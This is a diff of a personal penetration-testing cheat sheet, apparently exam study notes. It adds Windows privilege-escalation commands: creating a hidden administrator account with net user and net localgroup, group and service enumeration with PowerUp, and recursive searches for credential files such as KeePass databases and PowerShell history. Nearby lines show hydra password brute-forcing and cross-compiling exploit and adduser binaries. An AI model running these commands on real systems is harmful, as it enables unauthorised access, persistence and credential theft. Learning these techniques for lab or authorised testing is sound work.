@@ -11,18 +11,48 @@ platform:platform
 
 # Windows
 
+## Add user
+```bash
+> net user nuri password123! /add
+> net localgroup administrators nuri /add
+
+```
+
 ## Enumeration
 ```bash
+# Users and groups
 > whoami /priv
+> whoami /groups
+> net user | Get-LocalGroup
+> net user admin
+> net localgroup | Get-LocalGroup
+> net localgroup Administrators | Get-LocalGroupMember Administrators
+
+
 > systeminfo(OS NAME, OS VERSION)
-> certutil -urlcache -f http://192.168.45.176/winPEAS.exe winPEAS.exe
+> ipconfig
+> netstat -ano
+
+# Installed Applications
+> 
+
+# Putty
 > reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
 
+
+# Search for Modifiable services/executables with PowerUP.ps1
+> . .\PowerUp.ps1
+> Get-ModifiableServiceFile
+
+
 # Modifiable services/executables
-> sc qc service
+> Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartMode | Where-Object {$_.State -like 'Running'}
+> sc qc servicename
+
 
 # Scheduled tasks
 > schtasks /query /fo LIST /v
+
 
 # Search for juicy files
 > type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
@@ -32,7 +62,13 @@ platform:platform
 > Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
 > Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
 > Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.log,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
+
+
+
+
 ```
+
+
 
 
 ## Code Snippet to check where our code is executed
@@ -54,7 +90,12 @@ hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form 
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.211.201 http-get /
 ```
 
-## wappalyzer
+## Checklist
+- wappalyzer
+- sitemap.xml
+- robots.txt
+- check favicon
+-  
 
 ## gobuster
 ```bash
@@ -389,4 +430,5 @@ sudo apt install mingw-w64
 i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe
 i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
 
+x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
 ```
